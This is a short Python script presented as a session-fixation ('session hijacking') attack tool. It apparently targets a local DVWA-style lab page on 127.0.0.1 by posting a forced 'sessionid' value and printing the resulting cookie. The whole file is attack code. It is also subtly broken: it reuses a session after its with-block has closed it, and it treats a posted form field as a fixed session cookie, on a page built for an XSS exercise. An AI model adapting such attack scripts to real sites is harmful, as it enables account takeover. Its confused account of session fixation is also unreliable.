import requests

# Session Fixation using SFuzzer
class SessionHijacking:
    
    def __init__(self):
        self.target_url = "http://127.0.0.1:81/vulnerabilities/xss_d/"

    def initiate_session(self):
        with requests.Session() as s:
            s.get(self.target_url)
            return s
        
    def inject_malicious_code(self, session):
        payload = {"sessionid": "SFuzzer"}
        response = session.post(self.target_url, data=payload)
        return response.text.strip()
        
    def display_sessionid(self, session):
        response = session.get(self.target_url)
        print("Current Session ID:", response.cookies.get("sessionid"))

def main():
    sessionhijack = SessionHijacking()
    
    with sessionhijack.initiate_session() as session:
        sessionhijack.inject_malicious_code(session)
        sessionhijack.display_sessionid(session)
        
if __name__ == "__main__":
    main()
